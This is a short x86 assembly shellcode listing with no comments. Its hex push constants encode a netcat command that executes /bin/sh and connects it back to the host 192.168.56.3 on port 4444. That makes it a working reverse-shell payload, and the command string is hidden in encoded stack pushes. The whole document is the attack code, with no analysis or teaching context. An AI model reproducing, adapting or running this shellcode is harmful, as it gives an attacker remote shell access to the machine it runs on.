.globl _start

_start:
	xor %eax, %eax
	push %eax
	push $0x20303434
	push $0x3420332e
	push $0x36352e38
	push $0x36312e32
	push $0x39312068
	push $0x732f6e69
	push $0x622f2065
	push $0x2d20636e
	push %eax
	push $0x7663622d
	push %eax
	push $0x68732f2f
	push $0x6e69622f
	mov %esp, %esi
	mov %esi, %ebx
	push %eax
	lea 0x14(%esi), %esi
	push %esi
	lea -0x8(%esi), %esi
	push %esi
	lea -0xc(%esi), %esi
	push %esi
	mov %esp, %ecx
	xor %edx, %edx
	mov $11, %al
	int $0x80
